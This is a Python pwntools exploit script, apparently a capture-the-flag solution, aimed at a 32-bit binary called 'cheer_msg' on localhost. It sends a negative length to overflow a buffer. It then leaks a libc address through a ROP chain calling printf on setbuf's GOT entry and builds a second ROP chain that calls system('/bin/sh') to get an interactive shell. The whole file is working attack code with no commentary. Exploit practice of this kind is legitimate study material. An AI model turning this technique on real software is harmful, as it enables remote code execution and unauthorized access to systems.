#!/usr/bin/env python
from pwn import *

rhp = {'host':"localhost", 'port':30527}
context(os = 'linux', arch = 'i386')

binf = ELF('./cheer_msg')
addr_got_setbuf = binf.got['setbuf']

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
offset_libc_setbuf = libc.symbols['setbuf']

def attack(conn):
    #----- Get addr_libc_base -----#
    binf_rop = ROP(binf)
    binf_rop.printf(addr_got_setbuf)
    binf_rop.main()

    conn.recvuntil('Message Length >> ')
    conn.sendline(str(-144))
    conn.recvuntil('Name >> ')
    conn.sendline(str(binf_rop))
    conn.recvuntil('Message : \n')

    addr_libc_setbuf = u32(conn.recv(4))
    libc.address = addr_libc_setbuf - offset_libc_setbuf
    info('addr_libc_base = 0x%08x' % libc.address)

    #----- Get shell -----#
    addr_libc_str_sh = next(libc.search('/bin/sh'))

    libc_rop = ROP(libc)
    libc_rop.system(addr_libc_str_sh)
    libc_rop.exit(0)

    conn.recvuntil('Message Length >> ')
    conn.sendline(str(-144))
    conn.recvuntil('Name >> ')
    conn.sendline(str(libc_rop))
    conn.recvuntil('Message : \n')
    
if __name__=='__main__':
    conn = remote(rhp['host'], rhp['port'])
    attack(conn)
    conn.interactive()

